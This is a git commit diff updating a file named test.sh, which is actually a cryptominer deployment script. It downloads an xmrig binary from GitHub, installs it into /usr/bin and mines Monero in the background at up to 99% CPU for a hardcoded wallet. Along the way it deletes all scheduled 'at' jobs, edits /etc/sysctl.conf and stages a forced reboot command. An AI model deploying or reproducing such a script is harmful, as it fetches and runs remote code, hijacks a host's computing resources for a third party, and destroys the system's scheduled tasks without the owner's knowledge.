f3a23a6e1cf64f3d3eae5c3dc624c6d0ab64ebe7
whaleby <43071077+whaleby@users.noreply.github.com>
2018-10-18 15:34:41 +0300

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,37 +1,29 @@
-#! /bin/bash
-if [ "$(whoami)" != "root" ]; then
-        echo -e "Sorry, you are not root. Please use sudo option"
-        exit 1
-fi
+#!/bin/bash
+
 WALLET=46Rj65VihKFXSe9Wf6Q6yX5TEXbXVmYZeNAgvDbFYBgEK1yXhAQEEGdWbwaVe4vUMveKAzAiA4j8xgUi29TpKXpm43Eq5B7
 ID="$(hostname)"
 MAIL=whaleby@yandex.ru
 PASSWORD=$ID:$MAIL
 THREADS="$(nproc --all)"
 
-#deleting all previous files, tasks, jobs and configs
+sleep 5
 rm -rf /tmp/miner/
 for i in `atq | awk '{print $1}'`;do atrm $i;done
-
 sudo dpkg --configure -a
-
+sleep 3
 echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
 sudo sysctl -p
-echo -e 'Installing updates and install soft...'
-sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev autotools-dev automake screen htop nano mc -y
-sleep 2
+sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
+sleep 4
 cd /tmp && mkdir miner
 git clone https://github.com/WilliamWizard/miner-xmr.git /tmp/miner
 cd /tmp/miner
-chmod +x /tmp/miner/xmrig
 sleep 1
+chmod +x /tmp/miner/xmrig
 cp /tmp/miner/xmrig /usr/bin/
 sleep 1
-#
-xmrig -o pool.supportxmr.com:5555 -u $WALLET --pass=$PASSWORD --rig-id="$(ID)" -B -l /tmp/miner/xmrig.log --donate-level=1 --print-time=10 --threads=$THREADS
-echo -e 'Miner started '
-echo -e 'Watch: '
-echo -e 'tail -f /tmp/miner/xmrig.log'
+xmrig -o pool.supportxmr.com:5555 -u $WALLET --pass=$PASSWORD --rig-id=$ID -B -l /tmp/miner/xmrig.log --donate-level=1 --print-time=10 --threads=$THREADS --cpu-priority=5 --background --max-cpu-usage=99 --av=1 --variant -1
+echo -e 'ALL WORKS! tail -f /tmp/miner/xmrig.log'
 
 touch /tmp/at.txt
 echo 'sudo reboot -f' >> /tmp/at.txt
